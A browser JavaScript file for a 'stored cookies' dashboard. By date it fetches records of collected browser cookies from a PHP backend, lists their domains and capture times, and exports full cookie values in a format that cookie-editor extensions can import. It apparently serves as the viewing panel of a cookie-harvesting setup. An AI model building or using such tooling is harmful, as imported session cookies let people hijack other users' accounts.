let date = new Date();
//alert(formatDate(date));
let currentDate = formatDate(date);
let headerTitle = document.getElementsByClassName("main-header-title")[0];
headerTitle.innerText = `stored cookies in ${currentDate}`;

let datePicker = document.querySelector(".date-picker");

let list = document.createElement("ul");
document.querySelector(".container").appendChild(list);

let emptyMsg = document.querySelector(".empty-msg");

datePicker.addEventListener("change", (e) => {
  list.innerHTML = null;
  headerTitle.innerText = `stored cookies in ${e.target.value}`;
  var xhttp = new XMLHttpRequest();
  xhttp.open(
    "GET",
    `https://publichtml/hdlrequest.php?request=1&date=${e.target.value}`,
    true
  );
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

  var response = [];

  xhttp.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      // Response

      response.push(this.responseText);
      let c = JSON.parse(response);
      let mainValues = [];
      let downloadBtn;
      c.map((item, index) => {
        //console.log(item);
        let val = item.value.replaceAll('""', '"'); //? for prevent error in parsing with two double quotes nextonext
        emptyMsg.innerText = "";
        let listItem = document.createElement("li");
        let link = document.createElement("a");
        downloadBtn = document.createElement("button");
        downloadBtn.innerText = "download";
        link.setAttribute("href", `single-item.html?id=${item.id}`);
        link.setAttribute("target", "_blank");

        mainValues.push(val);

        if (item.value !== "[]") {
          try {
            link.innerText = `id :   ${item.id}    domain name :   ${
              JSON.parse(val)[0]?.domain
            }   date: ${item.date}  time : ${item.time}`;
            listItem.appendChild(link);
            listItem.appendChild(downloadBtn);
            list.appendChild(listItem);
          } catch (e) {}
        }

        downloadBtn.addEventListener("click", () => {
          // console.log(mainValues[index]);
        
          try {
              // console.log(mainValues);
                      let b = "";
                      let r = JSON.parse(mainValues[index]);
                      r.map((item) => {
                        b += `{\n   "domain" : "${item.domain}",\n   "expirationDate" : "${item.expirationDate}",\n   "hostOnly" : "${item.hostOnly}",\n   "httpOnly" : "${item.httpOnly}",\n   "name" : "${item.name}",\n   "path" : "${item.path}",\n   "sameSite" : "${item.sameSite}",\n   "secure" : "${item.secure}",\n   "session" : "${item.session}",\n   "storeId" : "${item.storeId}",\n   "value" : "${item.value}",\n},\n`;
                      });

                      let content = `[\n${b}]`;
                      function download(content, fileName, contentType) {
                        var a = document.createElement("a");
                        var file = new Blob([content], { type: contentType });
                        a.href = URL.createObjectURL(file);
                        a.download = fileName;
                        a.click();
                      }
                      download(content, "stored cookies", "text/plain");
            
          } catch (e) {
           
          }

        });
      });
      if (!c) {
        emptyMsg.innerText = "this date is empty";
      }
    }
  };
  xhttp.send();
});

var xhttp = new XMLHttpRequest();
xhttp.open(
  "GET",
  `https://publichtml/hdlrequest.php?request=1&date=${currentDate}`,
  true
);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

var response = [];

xhttp.onreadystatechange = function () {
  if (this.readyState == 4 && this.status == 200) {
    // Response
    // console.log(this.responseText);

    //  console.log(g);
    response.push(this.responseText);
    // console.log(response);

    let c = JSON.parse(response);

    console.log(c);
    let mainValues = [];
    let downloadBtn;
    c.map((item, index) => {
      //  console.log(item);
      let val = item.value.replaceAll('""', '"'); //? for prevent error in parsing with two double quotes nextonext
      emptyMsg.innerText = "";
      let listItem = document.createElement("li");
      let link = document.createElement("a");
      downloadBtn = document.createElement("button");
      downloadBtn.innerText = "download";
      link.setAttribute("href", `single-item.html?id=${item.id}`);
      link.setAttribute("target", "_blank");

      mainValues.push(val);

      if (item.value !== "[]") {
        try {
          link.innerText = `id :   ${item.id}    domain name :   ${
            JSON.parse(val)[0]?.domain
          }   date: ${item.date}  time : ${item.time}`;
          listItem.appendChild(link);
          listItem.appendChild(downloadBtn);
          list.appendChild(listItem);
        } catch (e) {}
      }

      downloadBtn.addEventListener("click", () => {
        //  console.log(mainValues[index]);

        let b = "";
        let r = JSON.parse(mainValues[index]);
        r.map((item) => {
          b += `{\n   "domain" : "${item.domain}",\n   "expirationDate" : "${item.expirationDate}",\n   "hostOnly" : "${item.hostOnly}",\n   "httpOnly" : "${item.httpOnly}",\n   "name" : "${item.name}",\n   "path" : "${item.path}",\n   "sameSite" : "${item.sameSite}",\n   "secure" : "${item.secure}",\n   "session" : "${item.session}",\n   "storeId" : "${item.storeId}",\n   "value" : "${item.value}",\n},\n`;
        });

        let content = `[\n${b}]`;
        function download(content, fileName, contentType) {
          var a = document.createElement("a");
          var file = new Blob([content], { type: contentType });
          a.href = URL.createObjectURL(file);
          a.download = fileName;
          a.click();
        }
        download(content, "stored cookies", "text/plain");
      });
    });
    if (!c) {
      emptyMsg.innerText = "this date is empty";
    }
  }
};
xhttp.send();

//   response.push(this.responseText);
function formatDate(date) {
  var d = new Date(date),
    month = "" + (d.getMonth() + 1),
    day = "" + d.getDate(),
    year = d.getFullYear();

  if (month.length < 2) month = "0" + month;
  if (day.length < 2) day = "0" + day;

  return [year, month, day].join("-");
}
